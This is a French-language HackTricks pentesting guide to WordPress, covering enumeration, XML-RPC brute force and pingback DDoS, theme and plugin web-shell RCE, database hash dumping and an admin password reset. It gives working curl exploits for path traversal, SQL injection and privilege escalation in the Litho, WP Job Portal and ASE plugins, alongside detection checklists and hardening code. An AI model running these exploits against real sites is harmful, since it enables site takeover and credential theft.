# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- Les fichiers **téléchargés** vont à : `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- Les fichiers **de thèmes peuvent être trouvés dans /wp-content/themes/,** donc si vous modifiez un php du thème pour obtenir RCE, vous utiliserez probablement ce chemin. Par exemple : En utilisant le **thème twentytwelve**, vous pouvez **accéder** au fichier **404.php** dans : [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Une autre URL utile pourrait être : [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Dans **wp-config.php**, vous pouvez trouver le mot de passe root de la base de données.
- Chemins de connexion par défaut à vérifier : _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Fichiers principaux de WordPress**

- `index.php`
- `license.txt` contient des informations utiles telles que la version de WordPress installée.
- `wp-activate.php` est utilisé pour le processus d'activation par e-mail lors de la configuration d'un nouveau site WordPress.
- Dossiers de connexion (peuvent être renommés pour se cacher) :
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier qui représente une fonctionnalité de WordPress qui permet de transmettre des données avec HTTP agissant comme mécanisme de transport et XML comme mécanisme d'encodage. Ce type de communication a été remplacé par le [REST API](https://developer.wordpress.org/rest-api/reference) de WordPress.
- Le dossier `wp-content` est le répertoire principal où les plugins et thèmes sont stockés.
- `wp-content/uploads/` est le répertoire où tous les fichiers téléchargés sur la plateforme sont stockés.
- `wp-includes/` est le répertoire où les fichiers principaux sont stockés, tels que les certificats, les polices, les fichiers JavaScript et les widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et supérieures, WordPress génère un fichier XML de plan de site avec tous les articles publics et les types d'articles et taxonomies interrogeables publiquement.

**Post exploitation**

- Le fichier `wp-config.php` contient des informations requises par WordPress pour se connecter à la base de données, telles que le nom de la base de données, l'hôte de la base de données, le nom d'utilisateur et le mot de passe, les clés d'authentification et les sels, et le préfixe de la table de la base de données. Ce fichier de configuration peut également être utilisé pour activer le mode DEBUG, ce qui peut être utile pour le dépannage.

### Permissions des utilisateurs

- **Administrateur**
- **Éditeur** : Publie et gère ses propres articles et ceux des autres
- **Auteur** : Publie et gère ses propres articles
- **Contributeur** : Écrit et gère ses articles mais ne peut pas les publier
- **Abonné** : Parcourt les articles et édite son profil

## **Énumération passive**

### **Obtenir la version de WordPress**

Vérifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

À l'intérieur du **code source** de la page (exemple de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)) :

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Fichiers de lien CSS

![](<../../images/image (533).png>)

- Fichiers JavaScript

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtenir des thèmes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en général
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Énumération active

### Plugins et Thèmes

Vous ne pourrez probablement pas trouver tous les Plugins et Thèmes possibles. Pour les découvrir tous, vous devrez **forcer activement une liste de Plugins et Thèmes** (espérons-le pour nous, il existe des outils automatisés qui contiennent ces listes).

### Utilisateurs

- **ID Brute :** Vous obtenez des utilisateurs valides d'un site WordPress en forçant les IDs des utilisateurs :
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les réponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la réponse est **400**, alors l'id est **invalide**.

- **wp-json :** Vous pouvez également essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre point de terminaison `/wp-json/` qui peut révéler des informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que ce point de terminaison n'expose que les utilisateurs qui ont fait un post. **Seules les informations sur les utilisateurs ayant cette fonctionnalité activée seront fournies**.

Notez également que **/wp-json/wp/v2/pages** pourrait leak des adresses IP.

- **Énumération des noms d'utilisateur de connexion** : Lors de la connexion à **`/wp-login.php`**, le **message** est **différent** selon que le **nom d'utilisateur existe ou non**.

### XML-RPC

Si `xml-rpc.php` est actif, vous pouvez effectuer une attaque par force brute sur les identifiants ou l'utiliser pour lancer des attaques DoS sur d'autres ressources. (Vous pouvez automatiser ce processus[ en utilisant ceci](https://github.com/relarizky/wpxploit) par exemple).

Pour voir s'il est actif, essayez d'accéder à _**/xmlrpc.php**_ et envoyez cette requête :

**Vérifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce des identifiants**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des méthodes qui peuvent être utilisées pour bruteforcer des identifiants. Si vous pouvez en trouver un, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Le message _"Nom d'utilisateur ou mot de passe incorrect"_ dans une réponse de code 200 doit apparaître si les identifiants ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les identifiants corrects, vous pouvez télécharger un fichier. Dans la réponse, le chemin apparaîtra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Il existe également un **moyen plus rapide** de forcer les identifiants en utilisant **`system.multicall`** car vous pouvez essayer plusieurs identifiants dans la même requête :

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Contourner 2FA**

Cette méthode est destinée aux programmes et non aux humains, et est ancienne, donc elle ne prend pas en charge 2FA. Donc, si vous avez des identifiants valides mais que l'entrée principale est protégée par 2FA, **vous pourriez être en mesure d'abuser de xmlrpc.php pour vous connecter avec ces identifiants en contournant 2FA**. Notez que vous ne pourrez pas effectuer toutes les actions que vous pouvez faire via la console, mais vous pourriez tout de même être en mesure d'atteindre RCE comme l'explique Ippsec dans [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ou scan de port**

Si vous pouvez trouver la méthode _**pingback.ping**_ dans la liste, vous pouvez faire en sorte que Wordpress envoie une requête arbitraire à n'importe quel hôte/port.\
Cela peut être utilisé pour demander à **des milliers** de **sites** Wordpress d'**accéder** à un **emplacement** (ce qui provoque un **DDoS** à cet emplacement) ou vous pouvez l'utiliser pour faire en sorte que **Wordpress** **scanne** un **réseau** interne (vous pouvez indiquer n'importe quel port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **supérieure** à **0** (17), cela signifie que le port est ouvert.

Jetez un œil à l'utilisation de **`system.multicall`** dans la section précédente pour apprendre comment abuser de cette méthode pour provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier existe généralement à la racine du site Wordpress : **`/wp-cron.php`**\
Lorsque ce fichier est **accédé**, une requête MySQL "**lourde**" est effectuée, il pourrait donc être utilisé par des **attaquants** pour **causer** un **DoS**.\
De plus, par défaut, le `wp-cron.php` est appelé à chaque chargement de page (chaque fois qu'un client demande une page Wordpress), ce qui, sur des sites à fort trafic, peut causer des problèmes (DoS).

Il est recommandé de désactiver Wp-Cron et de créer un véritable cronjob sur l'hôte qui effectue les actions nécessaires à intervalles réguliers (sans causer de problèmes).

### /wp-json/oembed/1.0/proxy - SSRF

Essayez d'accéder à _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Wordpress pourrait vous faire une requête.

Voici la réponse lorsque cela ne fonctionne pas :

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil vérifie si le **methodName: pingback.ping** et pour le chemin **/wp-json/oembed/1.0/proxy** existent, et s'ils existent, il essaie de les exploiter.

## Outils Automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Accéder en écrasant un bit

Plus qu'une véritable attaque, c'est une curiosité. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man), vous pouviez inverser 1 bit de n'importe quel fichier wordpress. Ainsi, vous pouviez inverser la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour NOP l'opération NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifier un php du thème utilisé (identifiants administratifs nécessaires)**

Apparence → Éditeur de thème → Modèle 404 (à droite)

Changez le contenu pour un shell php :

![](<../../images/image (384).png>)

Recherchez sur internet comment accéder à cette page mise à jour. Dans ce cas, vous devez accéder ici : [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

Il peut être possible de télécharger des fichiers .php en tant que plugin.\
Créez votre backdoor php en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

Téléchargez le plugin et appuyez sur Installer maintenant :

![](<../../images/image (249).png>)

Cliquez sur Procéder :

![](<../../images/image (70).png>)

Probablement, cela ne fera apparemment rien, mais si vous allez dans Médias, vous verrez votre shell téléchargé :

![](<../../images/image (462).png>)

Accédez-y et vous verrez l'URL pour exécuter le reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Cette méthode implique l'installation d'un plugin malveillant connu pour être vulnérable et pouvant être exploité pour obtenir un web shell. Ce processus est réalisé via le tableau de bord WordPress comme suit :

1. **Acquisition du plugin** : Le plugin est obtenu à partir d'une source comme Exploit DB comme [**ici**](https://www.exploit-db.com/exploits/36374).
2. **Installation du plugin** :
- Accédez au tableau de bord WordPress, puis allez à `Tableau de bord > Plugins > Télécharger le plugin`.
- Téléchargez le fichier zip du plugin téléchargé.
3. **Activation du plugin** : Une fois le plugin installé avec succès, il doit être activé via le tableau de bord.
4. **Exploitation** :
- Avec le plugin "reflex-gallery" installé et activé, il peut être exploité car il est connu pour être vulnérable.
- Le framework Metasploit fournit un exploit pour cette vulnérabilité. En chargeant le module approprié et en exécutant des commandes spécifiques, une session meterpreter peut être établie, accordant un accès non autorisé au site.
- Il est noté que ceci n'est qu'une des nombreuses méthodes pour exploiter un site WordPress.

Le contenu comprend des aides visuelles décrivant les étapes dans le tableau de bord WordPress pour installer et activer le plugin. Cependant, il est important de noter que l'exploitation de vulnérabilités de cette manière est illégale et contraire à l'éthique sans autorisation appropriée. Ces informations doivent être utilisées de manière responsable et uniquement dans un contexte légal, comme le pentesting avec autorisation explicite.

**Pour des étapes plus détaillées, consultez :** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script conçu pour escalader une vulnérabilité **Cross-Site Scripting (XSS)** à **Remote Code Execution (RCE)** ou d'autres vulnérabilités critiques dans WordPress. Pour plus d'infos, consultez [**ce post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il fournit **un support pour les versions de WordPress 6.X.X, 5.X.X et 4.X.X et permet de :**
- _**Escalade de privilèges :**_ Crée un utilisateur dans WordPress.
- _**(RCE) Téléchargement de plugin personnalisé (backdoor) :**_ Téléchargez votre plugin personnalisé (backdoor) dans WordPress.
- _**(RCE) Édition de plugin intégré :**_ Éditez des plugins intégrés dans WordPress.
- _**(RCE) Édition de thème intégré :**_ Éditez des thèmes intégrés dans WordPress.
- _**(Personnalisé) Exploits personnalisés :**_ Exploits personnalisés pour des plugins/thèmes WordPress tiers.

## Post Exploitation

Extraire les noms d'utilisateur et les mots de passe :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe administrateur :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest des Plugins Wordpress

### Surface d'Attaque

Savoir comment un plugin Wordpress peut exposer des fonctionnalités est essentiel pour trouver des vulnérabilités dans son fonctionnement. Vous pouvez découvrir comment un plugin pourrait exposer des fonctionnalités dans les points suivants et quelques exemples de plugins vulnérables dans [**cet article de blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

L'une des façons dont un plugin peut exposer des fonctions aux utilisateurs est via des gestionnaires AJAX. Ceux-ci pourraient contenir des bogues de logique, d'autorisation ou d'authentification. De plus, il est assez fréquent que ces fonctions basent à la fois l'authentification et l'autorisation sur l'existence d'un nonce Wordpress que **tout utilisateur authentifié dans l'instance Wordpress pourrait avoir** (indépendamment de son rôle).

Ce sont les fonctions qui peuvent être utilisées pour exposer une fonction dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend le point de terminaison accessible à tous les utilisateurs (même ceux non authentifiés).**

> [!CAUTION]
> De plus, si la fonction vérifie simplement l'autorisation de l'utilisateur avec la fonction `wp_verify_nonce`, cette fonction vérifie seulement si l'utilisateur est connecté, elle ne vérifie généralement pas le rôle de l'utilisateur. Ainsi, des utilisateurs à faible privilège pourraient avoir accès à des actions à haut privilège.

- **REST API**

Il est également possible d'exposer des fonctions de WordPress en enregistrant une API REST à l'aide de la fonction `register_rest_route` :
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Le `permission_callback` est un rappel à une fonction qui vérifie si un utilisateur donné est autorisé à appeler la méthode API.

**Si la fonction intégrée `__return_true` est utilisée, elle ignorera simplement la vérification des permissions de l'utilisateur.**

- **Accès direct au fichier php**

Bien sûr, Wordpress utilise PHP et les fichiers à l'intérieur des plugins sont directement accessibles depuis le web. Donc, dans le cas où un plugin expose une fonctionnalité vulnérable qui est déclenchée simplement en accédant au fichier, elle sera exploitable par n'importe quel utilisateur.

### Suppression de fichiers arbitraires non authentifiée via wp_ajax_nopriv (Thème Litho <= 3.0)

Les thèmes et plugins WordPress exposent fréquemment des gestionnaires AJAX via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Lorsque la variante **_nopriv_** est utilisée, **le rappel devient accessible par des visiteurs non authentifiés**, donc toute action sensible doit également mettre en œuvre :

1. Une **vérification de capacité** (par exemple `current_user_can()` ou au moins `is_user_logged_in()`), et
2. Un **nonce CSRF** validé avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. Une **sanitisation / validation stricte des entrées**.

Le thème multipurpose Litho (< 3.1) a oublié ces 3 contrôles dans la fonctionnalité *Remove Font Family* et a fini par expédier le code suivant (simplifié) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problèmes introduits par ce snippet :

* **Accès non authentifié** – le hook `wp_ajax_nopriv_` est enregistré.
* **Pas de vérification de nonce / de capacité** – tout visiteur peut accéder à l'endpoint.
* **Pas de sanitisation de chemin** – la chaîne `fontfamily` contrôlée par l'utilisateur est concaténée à un chemin de système de fichiers sans filtrage, permettant un parcours classique `../../`.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou répertoire **en dessous du répertoire de base des uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requête HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre séquences `../` suffisent sur une installation par défaut. Supprimer `wp-config.php` force WordPress à entrer dans l'*assistant d'installation* lors de la prochaine visite, permettant une prise de contrôle complète du site (l'attaquant fournit simplement une nouvelle configuration de base de données et crée un utilisateur administrateur).

D'autres cibles impactantes incluent les fichiers `.php` de plugins/thèmes (pour contourner les plugins de sécurité) ou les règles `.htaccess`.

#### Liste de vérification de détection

* Tout rappel `add_action( 'wp_ajax_nopriv_...')` qui appelle des helpers de système de fichiers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concaténation d'entrées utilisateur non assainies dans des chemins (recherchez `$_POST`, `$_GET`, `$_REQUEST`).
* Absence de `check_ajax_referer()` et `current_user_can()`/`is_user_logged_in()`.

#### Renforcement
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// … proceed …
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  🔒  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Toujours** traiter toute opération d'écriture/suppression sur le disque comme privilégiée et vérifier deux fois :
> • Authentification  • Autorisation  • Nonce  • Assainissement des entrées  • Contention de chemin (par exemple via `realpath()` plus `str_starts_with()`).

---

### Escalade de privilèges via la restauration de rôle obsolète et l'autorisation manquante (ASE "Voir Admin en tant que Rôle")

De nombreux plugins implémentent une fonctionnalité "voir en tant que rôle" ou de changement de rôle temporaire en sauvegardant le(s) rôle(s) original(aux) dans les métadonnées utilisateur afin qu'ils puissent être restaurés plus tard. Si le chemin de restauration repose uniquement sur des paramètres de requête (par exemple, `$_REQUEST['reset-for']`) et une liste maintenue par le plugin sans vérifier les capacités et un nonce valide, cela devient une escalade de privilèges verticale.

Un exemple du monde réel a été trouvé dans le plugin Admin and Site Enhancements (ASE) (≤ 7.6.2.1). La branche de réinitialisation restaurait les rôles en fonction de `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni une vérification `current_user_can()` ni une vérification de nonce avant de supprimer les rôles actuels et de réajouter les rôles sauvegardés des métadonnées utilisateur `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c'est exploitable

- Fait confiance à `$_REQUEST['reset-for']` et à une option de plugin sans autorisation côté serveur.
- Si un utilisateur avait précédemment des privilèges plus élevés enregistrés dans `_asenha_view_admin_as_original_roles` et a été rétrogradé, il peut les restaurer en accédant au chemin de réinitialisation.
- Dans certaines déploiements, tout utilisateur authentifié pourrait déclencher une réinitialisation pour un autre nom d'utilisateur toujours présent dans `viewing_admin_as_role_are` (autorisation rompue).

Prérequis à l'attaque

- Version de plugin vulnérable avec la fonctionnalité activée.
- Le compte cible a un rôle de haute privilège obsolète stocké dans les métadonnées utilisateur d'une utilisation antérieure.
- Toute session authentifiée ; nonce/capacité manquante dans le flux de réinitialisation.

Exploitation (exemple)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les versions vulnérables, cela supprime les rôles actuels et réajoute les rôles originaux sauvegardés (par exemple, `administrator`), ce qui permet d'escalader les privilèges.

Liste de vérification de détection

- Recherchez des fonctionnalités de changement de rôle qui persistent les “rôles originaux” dans les métadonnées utilisateur (par exemple, `_asenha_view_admin_as_original_roles`).
- Identifiez les chemins de réinitialisation/restauration qui :
  - Lisent les noms d'utilisateur à partir de `$_REQUEST` / `$_GET` / `$_POST`.
  - Modifient les rôles via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
  - Autorisent en fonction d'un tableau d'options de plugin (par exemple, `viewing_admin_as_role_are`) au lieu des capacités de l'acteur.

Renforcement

- Appliquez des vérifications de capacité sur chaque branche modifiant l'état (par exemple, `current_user_can('manage_options')` ou plus strict).
- Exigez des nonces pour toutes les mutations de rôle/permission et vérifiez-les : `check_admin_referer()` / `wp_verify_nonce()`.
- Ne faites jamais confiance aux noms d'utilisateur fournis par la requête ; résolvez l'utilisateur cible côté serveur en fonction de l'acteur authentifié et d'une politique explicite.
- Invalidez l'état des “rôles originaux” lors des mises à jour de profil/rôle pour éviter la restauration de privilèges élevés obsolètes :
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- Envisagez de stocker un état minimal et d'utiliser des jetons temporaires, protégés par des capacités, pour des changements de rôle temporaires.

---

## Protection de WordPress

### Mises à jour régulières

Assurez-vous que WordPress, les plugins et les thèmes sont à jour. Confirmez également que la mise à jour automatique est activée dans wp-config.php :
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Aussi, **n'installez que des plugins et thèmes WordPress fiables**.

### Plugins de sécurité

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur **admin** par défaut
- Utilisez des **mots de passe forts** et **2FA**
- **Révisez** périodiquement les **permissions** des utilisateurs
- **Limitez les tentatives de connexion** pour prévenir les attaques par force brute
- Renommez le fichier **`wp-admin.php`** et n'autorisez l'accès qu'en interne ou depuis certaines adresses IP.


### Injection SQL non authentifiée via validation insuffisante (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal a exposé une tâche **savecategory** qui exécute finalement le code vulnérable suivant à l'intérieur de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduites par ce snippet :

1. **Entrée utilisateur non assainie** – `parentid` provient directement de la requête HTTP.
2. **Concaténation de chaînes à l'intérieur de la clause WHERE** – pas de `is_numeric()` / `esc_sql()` / instruction préparée.
3. **Accessibilité non authentifiée** – bien que l'action soit exécutée via `admin-post.php`, la seule vérification en place est un **nonce CSRF** (`wp_verify_nonce()`), que tout visiteur peut récupérer depuis une page publique intégrant le shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Récupérer un nonce frais :
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injecter un SQL arbitraire en abusant de `parentid` :
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La réponse divulgue le résultat de la requête injectée ou modifie la base de données, prouvant SQLi.


### Téléchargement de fichiers arbitraires non authentifié / Traversée de chemin (WP Job Portal <= 2.3.2)

Une autre tâche, **downloadcustomfile**, permettait aux visiteurs de télécharger **n'importe quel fichier sur le disque** via une traversée de chemin. Le sink vulnérable est situé dans `modules/customfield/model.php::downloadCustomUploadedFile()` :
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contrôlé par l'attaquant et concaténé **sans assainissement**. Encore une fois, le seul verrou est un **nonce CSRF** qui peut être récupéré depuis la page de résumé.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur répond avec le contenu de `wp-config.php`, révélant les identifiants de la base de données et les clés d'authentification.

## Références

- [Vulnérabilité de suppression de fichier arbitraire non authentifiée dans le thème Litho](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Plusieurs vulnérabilités critiques corrigées dans le plugin WP Job Portal](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Cas rare d'escalade de privilèges dans le plugin ASE affectant plus de 100k sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [Changement de version ASE 7.6.3 – supprimer les rôles originaux lors de la mise à jour du profil](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
